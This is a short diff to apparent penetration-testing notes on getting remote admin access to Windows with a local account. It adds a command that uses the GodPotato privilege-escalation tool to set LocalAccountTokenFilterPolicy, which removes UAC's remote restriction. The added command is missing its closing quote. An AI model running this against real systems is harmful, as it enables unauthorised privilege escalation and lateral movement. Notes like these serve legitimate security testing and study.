@@ -21,4 +21,6 @@ easiest solution is to create a new local admin account
 
 by default, all local administrators except "Administrator" do not get administrative access from remote
 - can be disabled with the registry key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`
-
+```
+./GodPotato.exe -cmd "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
+```
